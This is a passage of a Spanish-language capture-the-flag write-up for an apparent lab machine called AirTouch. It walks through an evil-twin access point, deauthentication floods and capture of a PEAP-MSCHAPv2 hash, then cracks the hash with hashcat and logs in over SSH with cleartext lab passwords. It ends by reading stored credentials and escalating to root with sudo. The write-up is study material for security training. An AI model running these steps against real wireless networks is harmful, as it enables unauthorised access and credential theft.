\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
 \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|
     \/     \/|__|        \/     \/      \/      \/     \/


                        Now with more fast travel than a next-gen Bethesda game. >:D

                             Version:  1.14.0
                            Codename:  Final Frontier
                              Author:  @s0lst1c3
                             Contact:  gabriel<<at>>transmitengage.com


[?] Am I root?
[*] Checking for rootness...
[*] I AM ROOOOOOOOOOOOT
[*] Root privs confirmed! 8D
[*] Saving current iptables configuration...
[*] Reticulating radio frequency splines...
Error: Could not create NMClient object: Could not connect: No such file or directory.

[*] Using nmcli to tell NetworkManager not to manage wlan4...

100%|████████████████████████████████████████████████████████████████████████████████████████████████████| 1/1 [00:01<00:00,  1.00s/it]

[*] Success: wlan4 no longer controlled by NetworkManager.
[*] WPA handshakes will be saved to /root/eaphammer/loot/wpa_handshake_capture-2026-04-12-20-50-49-AYtRAd9tEFIzZMAhvq7SJX5865RvbB0x.hccapx

[hostapd] AP starting...

Configuration file: /root/eaphammer/tmp/hostapd-2026-04-12-20-50-49-UBlBLJgkx1dljXQQHbkeoVZnIGUxBBlQ.conf
rfkill: Cannot open RFKILL control device
wlan4: interface state UNINITIALIZED->COUNTRY_UPDATE
Using interface wlan4 with hwaddr 00:11:22:33:44:00 and ssid "AirTouch-Office"
wlan4: interface state COUNTRY_UPDATE->ENABLED
wlan4: AP-ENABLED


Press enter to quit...
```

Se queda bloqueado, esperando un intento de autenticación. En otra consola, usaré una nueva interfaz en modo de monitorización para enviar mensajes de desautenticación a ambos puntos de acceso:

```bash
root@AirTouch-Consultant:~# iw dev wlan5 set type monitor
root@AirTouch-Consultant:~# ip link set wlan5 up
root@AirTouch-Consultant:~# iw dev wlan5 set channel 44
root@AirTouch-Consultant:~# aireplay-ng -0 10 -a AC:8B:A9:AA:3F:D2 wlan5; aireplay-ng -0 10 -a AC:8B:A9:F3:A1:13 wlan5
20:59:27  Waiting for beacon frame (BSSID: AC:8B:A9:AA:3F:D2) on channel 44
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
20:59:27  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
20:59:28  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
20:59:28  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
20:59:29  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
20:59:29  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
20:59:30  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
20:59:30  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
20:59:30  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
20:59:31  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
20:59:31  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
20:59:32  Waiting for beacon frame (BSSID: AC:8B:A9:F3:A1:13) on channel 44
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
20:59:32  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
20:59:32  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
20:59:33  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
20:59:33  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
20:59:34  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
20:59:34  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
20:59:35  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
20:59:35  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
20:59:36  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
20:59:36  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
```

Mientras eso se está ejecutando, obtengo la autenticación en `eaphammer`:

```bash
Press enter to quit...

wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.11: authenticated
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.11: associated (aid 1)
wlan4: CTRL-EVENT-EAP-STARTED 28:6c:07:12:ee:f3
wlan4: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan4: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25


mschapv2: Sun Apr 12 20:59:32 2026
         domain\username:               AirTouch\r4ulcl
         username:                      r4ulcl
         challenge:                     a2:3d:68:e5:dc:dc:cb:a1
         response:                      34:ee:c9:f8:ba:ce:de:bb:c8:2e:e2:b8:73:d5:96:df:de:89:20:a5:c7:3d:9f:ed

         jtr NETNTLM:                   r4ulcl:$NETNTLM$a23d68e5dcdccba1$34eec9f8bacedebbc82ee2b873d596dfde8920a5c73d9fed

         hashcat NETNTLM:               r4ulcl::::34eec9f8bacedebbc82ee2b873d596dfde8920a5c73d9fed:a23d68e5dcdccba1


wlan4: CTRL-EVENT-EAP-FAILURE 28:6c:07:12:ee:f3
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.11: deauthenticated due to local deauth request
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.11: authenticated
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.11: associated (aid 1)
wlan4: CTRL-EVENT-EAP-STARTED 28:6c:07:12:ee:f3
wlan4: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan4: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25


mschapv2: Sun Apr 12 20:59:45 2026
         domain\username:               AirTouch\r4ulcl
         username:                      r4ulcl
         challenge:                     18:0b:04:4b:d3:9a:62:ec
         response:                      a1:c8:30:70:07:69:a6:67:fc:2b:24:c1:61:43:0d:90:2e:e9:e1:92:a6:83:d0:6f

         jtr NETNTLM:                   r4ulcl:$NETNTLM$180b044bd39a62ec$a1c830700769a667fc2b24c161430d902ee9e192a683d06f

         hashcat NETNTLM:               r4ulcl::::a1c830700769a667fc2b24c161430d902ee9e192a683d06f:180b044bd39a62ec


wlan4: CTRL-EVENT-EAP-FAILURE 28:6c:07:12:ee:f3
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.1X: authentication failed - EAP type: 0 (unknown)
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.1X: Supplicant used different EAP type: 25 (PEAP)
wlan4: STA 28:6c:07:12:ee:f3 IEEE 802.11: deauthenticated due to local deauth request
```

## Respuesta al desafío de Crack


El desafío/respuesta *MSCHAPv2* en un intercambio *PEAP-MSCHAPv2* es matemáticamente idéntico a un desafío/respuesta NetNTLMv1, por lo que el material capturado se puede descifrar sin conexión como un hash NetNTLMv1. Guardaré la salida de “hashcat NETNTLM” en un archivo y se la pasaré a hashcat:

```bash
$ hashcat ./AirTouch-Office.hash rockyou.txt                    
hashcat (v7.1.2) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.    
The following mode was auto-detected as the only one matching your input hash:

5500 | NetNTLMv1 / NetNTLMv1+ESS | Network Protocol   
...[snip]...
r4ulcl::::a1c830700769a667fc2b24c161430d902ee9e192a683d06f:180b044bd39a62ec:laboratory
...[snip]...
```

Identifica el formato hash y lo descifra *rockyou.txt* en menos de 10 segundos en mi ordenador.

Conéctese a AirTouch-Office

Voy a crear un *airtouch-office.conf* archivo:

```bash
network={
    ssid="AirTouch-Office"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="AirTouch\r4ulcl"
    password="laboratory"
    phase2="auth=MSCHAPV2"
}
```
Ahora usa `wpa_supplicant` para conectar:

```bash
root@AirTouch-Consultant:~# wpa_supplicant -i wlan6 -c ./airtouch-office.conf 
Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
nl80211: Could not set interface 'p2p-dev-wlan6' UP
nl80211: deinit ifname=p2p-dev-wlan6 disabled_11b_rates=0
p2p-dev-wlan6: Failed to initialize driver interface
P2P: Failed to enable P2P Device interface
wlan6: SME: Trying to authenticate with ac:8b:a9:aa:3f:d2 (SSID='AirTouch-Office' freq=5220 MHz)
wlan6: Trying to associate with ac:8b:a9:aa:3f:d2 (SSID='AirTouch-Office' freq=5220 MHz)
wlan6: Associated with ac:8b:a9:aa:3f:d2
wlan6: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlan6: CTRL-EVENT-EAP-STARTED EAP authentication started
wlan6: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
wlan6: CTRL-EVENT-EAP-METHOD EAP vendor 0 method 25 (PEAP) selected
wlan6: CTRL-EVENT-EAP-PEER-CERT depth=1 subject='/C=ES/ST=Madrid/L=Madrid/O=AirTouch/OU=Certificate Authority/CN=AirTouch CA/emailAddress=ca@AirTouch.htb' hash=222a7dd4d28c97c8e4730762fa9a102af05c7d56b35279b2f5ee4da7ddf918a8
wlan6: CTRL-EVENT-EAP-PEER-CERT depth=0 subject='/C=ES/L=Madrid/O=AirTouch/OU=Server/CN=AirTouch CA/emailAddress=server@AirTouch.htb' hash=ef39f3fff0883db7fc8a535c52f80509fc395e9889061e209102307b46995864
EAP-MSCHAPV2: Authentication succeeded
wlan6: CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully
wlan6: PMKSA-CACHE-ADDED ac:8b:a9:aa:3f:d2 0
wlan6: WPA: Key negotiation completed with ac:8b:a9:aa:3f:d2 [PTK=CCMP GTK=CCMP]
wlan6: CTRL-EVENT-CONNECTED - Connection to ac:8b:a9:aa:3f:d2 completed [id=0 id_str=]
```

Esto se queda colgado, pero puedo presionar Ctrl+Z bgpara que se ejecute en segundo plano o usar otra terminal. iw Puedo verificar que está conectado:

```bash
root@AirTouch-Consultant:~# iw dev wlan6 link
Connected to ac:8b:a9:aa:3f:d2 (on wlan6)
        SSID: AirTouch-Office
        freq: 5220
        RX: 118531 bytes (1613 packets)
        TX: 1885 bytes (38 packets)
        signal: -30 dBm
        rx bitrate: 6.0 MBit/s
        tx bitrate: 54.0 MBit/s

        bss flags:      short-slot-time
        dtim period:    2
        beacon int:     100

```        
*dhclient* obtendrá una IP:

```bash
root@AirTouch-Consultant:~# dhclient -v wlan6
Internet Systems Consortium DHCP Client 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/

Listening on LPF/wlan6/02:00:00:00:06:00
Sending on   LPF/wlan6/02:00:00:00:06:00
Sending on   Socket/fallback
DHCPDISCOVER on wlan6 to 255.255.255.255 port 67 interval 3 (xid=0x8eafc62c)
DHCPDISCOVER on wlan6 to 255.255.255.255 port 67 interval 7 (xid=0x8eafc62c)
DHCPOFFER of 10.10.10.38 from 10.10.10.1
DHCPREQUEST for 10.10.10.38 on wlan6 to 255.255.255.255 port 67 (xid=0x2cc6af8e)
DHCPACK of 10.10.10.38 from 10.10.10.1 (xid=0x8eafc62c)
bound to 10.10.10.38 -- renewal in 429204 seconds.
root@AirTouch-Consultant:~# ip addr show wlan6
13: wlan6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:06:00 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.38/24 brd 10.10.10.255 scope global dynamic wlan6
       valid_lft 863006sec preferred_lft 863006sec
    inet6 fe80::ff:fe00:600/64 scope link 
       valid_lft forever preferred_lft forever
```

## SSH

Usaré las credenciales recopiladas anteriormente para conectarme a través de SSH (ya sea desde AirTouch-Consultant o a través de proxychains):

```bash
jorge@hacky$ proxychains sshpass -p xGgWEwqUpfoOVsLeROeG ssh remote@10.10.10.1
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.10.1:22  ...  OK
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
...[snip]...
remote@AirTouch-AP-MGT:~$
```


# Shell como root@AirTouch-AP-MGT
## Enumeración
## Usuarios

El directorio personal del usuario remoto está muy vacío:

```bash
remote@AirTouch-AP-MGT:~$ ls -la
total 36
drwxr-xr-x 1 remote remote 4096 Apr 13 01:32 .
drwxr-xr-x 1 root   root   4096 Jan 13 14:55 ..
-rw-rw-r-- 1 remote remote    1 Nov 24  2024 .bash_history
-rw-r--r-- 1 remote remote  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 remote remote 3771 Feb 25  2020 .bashrc
drwx------ 2 remote remote 4096 Apr 13 01:32 .cache
-rw-r--r-- 1 remote remote  807 Feb 25  2020 .profile
```
Hay un usuario adicional con un directorio de inicio en /home:

```bash
remote@AirTouch-AP-MGT:/home$ ls
admin  remote
```

Esto es coherente con los usuarios con `shells` configurados en passwd:

```bash
remote@AirTouch-AP-MGT:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
remote:x:1000:1000::/home/remote:/bin/bash
admin:x:1001:1001::/home/admin:/bin/bash
```

Se puede acceder de forma remota /home/admin, y también está vacío:

```bash
remote@AirTouch-AP-MGT:/home/admin$ ls -la
total 28
drwxr-xr-x 1 admin admin 4096 Jan 13 14:55 .
drwxr-xr-x 1 root  root  4096 Jan 13 14:55 ..
-rw-rw-r-- 1 admin admin    1 Nov 24  2024 .bash_history
-rw-r--r-- 1 admin admin  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 admin admin 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 admin admin  807 Feb 25  2020 .profile
```

El control remoto no se puede ejecutar sudoen *AirTouch-AP-MGT*:

```bash
remote@AirTouch-AP-MGT:/home/admin$ sudo -l
[sudo] password for remote: 
Sorry, user remote may not run sudo on AirTouch-AP-MGT.
```

## Procesos

Los únicos servicios de escucha son SSH y DNS:

```bash
remote@AirTouch-AP-MGT:/$ netstat -tnl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp6       0      0 :::53                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN
```

La lista de procesos es muy corta (probablemente porque estamos en un contenedor Docker):

```bash
remote@AirTouch-AP-MGT:/$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2608   596 ?        Ss   Apr10   0:00 /bin/sh -c service ssh start && tail -f /dev/null
root          15  0.0  0.1  12188  4180 ?        Ss   Apr10   0:35 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          16  0.0  0.0   2544   512 ?        S    Apr10   0:23 tail -f /dev/null
root          28  0.0  0.0   3976  3076 ?        Ss   Apr10   0:00 bash /root/start.sh
root          45  0.1  0.1  10624  7972 ?        S    Apr10   5:27 hostapd_aps /root/mgt/hostapd_wpe.conf
root          46  0.1  0.1  10640  8024 ?        S    Apr10   5:37 hostapd_aps /root/mgt/hostapd_wpe2.conf
root          63  0.0  0.0   9300  3788 ?        S    Apr10   0:00 dnsmasq -d
root      624537  0.0  0.2  13912  8972 ?        Ss   01:32   0:00 sshd: remote [priv]
remote    624548  0.0  0.1  13912  5312 ?        S    01:32   0:00 sshd: remote@pts/0
remote    624549  0.0  0.1   5992  4024 pts/0    Ss   01:32   0:00 -bash
remote    732988  0.0  0.0   7644  3200 pts/0    R+   11:00   0:00 ps auxww
```

*dnsmasq*, un servidor DNS de código abierto , explica por qué el host está escuchando en el puerto 53.

## hostapd

*hostapd_aps* También se ejecuta con dos archivos de configuración diferentes. hostapd Se define a sí mismo como:

hostapd es un demonio de espacio de usuario para servidores de punto de acceso y autenticación. Implementa la gestión de puntos de acceso IEEE 802.11, autenticadores IEEE 802.1X/WPA/WPA2/WPA3/EAP, cliente RADIUS, servidor EAP y servidor de autenticación RADIUS. La versión actual es compatible con Linux (controladores basados ​​en Host AP, madwifi y mac80211) y FreeBSD (net80211).

`hostapd_aps` no es un nombre binario muy conocido. Al ejecutarlo con -vse muestra el banner estándar hostapd:

```bash
remote@AirTouch-AP-MGT:/$ hostapd_aps -v
hostapd v2.9
User space daemon for IEEE 802.11 AP management,
IEEE 802.1X/WPA/WPA2/EAP/RADIUS Authenticator
Copyright (c) 2002-2019, Jouni Malinen <j@w1.fi> and contributors
```

Aún podría haber cambios en el código, pero al menos está basado en o intenta parecerse a hostapd.

No puedo acceder a ninguno de los archivos de configuración en ejecución, ya que se encuentran en /root. Hay archivos de configuración en */etc/hostapd* :

```bash
remote@AirTouch-AP-MGT:/$ ls /etc/hostapd/
hostapd_wpe.conf.tmp  hostapd_wpe.eap_user  hostapd_wpe2.conf.tmp  ifupdown.sh
```

*hostapd_wpe.eap_user* Aquí es donde se almacenan las credenciales de los distintos usuarios:

```bash
remote@AirTouch-AP-MGT:/etc/hostapd$ cat hostapd_wpe.eap_user | grep -v '^#' | grep .
*               PEAP,TTLS,TLS,FAST
*       PEAP,TTLS,TLS,FAST [ver=1]
"AirTouch\r4ulcl"                           MSCHAPV2            "laboratory" [2]
"admin"                                 MSCHAPV2                "xMJpzXt4D9ouMuL3JJsMriF7KZozm7" [2]
```

Aquí es donde r4ulcl tiene su contraseña configurada como "laboratorio". También hay una contraseña para administrador.

# Escalada
## Shell como administrador

La contraseña también funciona para la cuenta local del usuario administrador:

```bash
remote@AirTouch-AP-MGT:/etc/hostapd$ su - admin
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@AirTouch-AP-MGT:~$

```

También puedo conectarme por SSH:

```bash
jorge@hacky$ proxychains sshpass -p xMJpzXt4D9ouMuL3JJsMriF7KZozm7 ssh admin@10.10.10.1
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.10.1:22  ...  OK
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
...[snip]...
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@AirTouch-AP-MGT:~$ 
```

#sudo

Tanto con su como **ssh** hay un mensaje que dice que use el sudocomando para ejecutar comandos como root. admin puede ejecutar cualquier comando como cualquier usuario sin contraseña:

```bash
admin@AirTouch-AP-MGT:~$ sudo -l
Matching Defaults entries for admin on AirTouch-AP-MGT:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on AirTouch-AP-MGT:
    (ALL) ALL
    (ALL) NOPASSWD: ALL
```

Lo usaré sudo *-ip* ara obtener una shell:

```bash
admin@AirTouch-AP-MGT:~$ sudo -i
root@AirTouch-AP-MGT:~#
```

Y lee la bandera:

```bash
root@AirTouch-AP-MGT:~# cat root.txt
29d0508a************************
```
